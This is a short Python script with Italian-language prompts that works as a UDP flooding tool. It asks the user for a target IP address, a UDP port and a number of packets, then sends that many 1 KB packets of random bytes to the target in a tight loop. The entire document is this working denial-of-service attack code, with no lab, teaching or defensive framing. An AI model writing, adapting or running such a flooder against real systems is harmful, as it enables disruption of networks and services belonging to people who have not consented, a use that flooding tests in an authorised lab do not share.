import socket
import random
import time 


target_ip = input("Inserisci l'IP della macchina target: ")


while True:
    try:
        target_port = int(input("Inserisci la porta UDP della macchina target: "))
        if 1 <= target_port <= 65535:
            break
        else:
            print("La porta deve essere compresa tra 1 e 65535.")
    except ValueError:
        print("Inserisci un numero valido.")


while True:
    try:
        num_packets = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))
        if num_packets > 0:
            break
        else:
            print("Inserisci un numero maggiore di zero.")
    except ValueError:
        print("Inserisci un numero valido.")

data = random._urandom(1024)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"\nInizio invio di {num_packets} pacchetti a {target_ip}:{target_port}...\n")

for i in range(1, num_packets + 1):
    sock.sendto(data, (target_ip, target_port))
    print(f"Pacchetto {i} inviato")
    time.sleep(0.001) 

print("\nInvio completato.")